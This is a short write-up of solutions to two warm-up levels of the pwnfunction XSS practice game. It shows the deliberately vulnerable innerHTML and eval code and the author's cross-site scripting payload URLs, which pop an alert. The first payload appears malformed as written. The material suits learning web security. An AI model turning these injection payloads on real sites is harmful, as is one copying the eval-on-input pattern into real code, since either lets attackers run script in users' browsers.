# pwnfunction - XSS Game (Solutions)

## Warmups

### Ma Spaghet!

```html
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

My solution: `https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=<svg>onload=alert(1337)>`

### Jefff

```html
<h2 id="maname"></h2>
<script>
    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
    let ma = ""
    eval(`ma = "Ma name ${jeff}"`)
    setTimeout(_ => {
        maname.innerText = ma
    }, 1000)
</script>
```

- I tried concatenation where `%2b` is `+`: `https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=abc"%2b"xyz`
- Then got a working payload: `https://sandbox.pwnfunction.com/warmups/jefff.html?jeff="%2balert(1337)%2b"`
- Intended solution: `"-alert(1337)-"`

